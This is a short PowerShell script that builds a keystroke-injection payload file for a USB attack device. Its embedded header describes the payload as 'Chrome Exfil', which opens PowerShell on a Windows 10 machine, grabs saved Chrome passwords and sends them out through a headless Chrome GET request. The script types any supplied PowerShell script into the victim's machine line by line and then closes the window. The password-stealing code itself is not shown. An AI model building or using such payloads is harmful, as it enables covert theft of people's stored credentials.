# Simple packager for powershell command and submission creator.
param([Parameter(Mandatory=$true)][string]$scriptFileName)

$script = Get-Content -Raw $scriptFileName
$outputFile = "payload.txt"

"REM Title: Chrome Exfil",
"REM Author: thisismyrobot",
"REM Description: Opens PowerShell, grabs Chrome passwords, exfils via headless Chrome GET request.",
"REM Target: Windows 10 (PowerShell + Chrome)",
"REM Version: 1.0",
"REM Category: Exfiltration",
"DEFAULTDELAY 10",
"DELAY 5000",
"GUI r",
"DELAY 250",
"STRING powershell",
"ENTER",
"DELAY 2500",
"STRING pwsh",
"ENTER",
"DELAY 2500" | Out-File -e "ASCII" "$outputFile"

$script.split("`n") | ForEach {"STRING $_`nENTER" | Out-File -a -e "ASCII" "$outputFile"}

"DELAY 1000",
"STRING exit",
"ENTER",
"DELAY 250",
"STRING exit",
"ENTER" | Out-File -a -e "ASCII" "$outputFile"
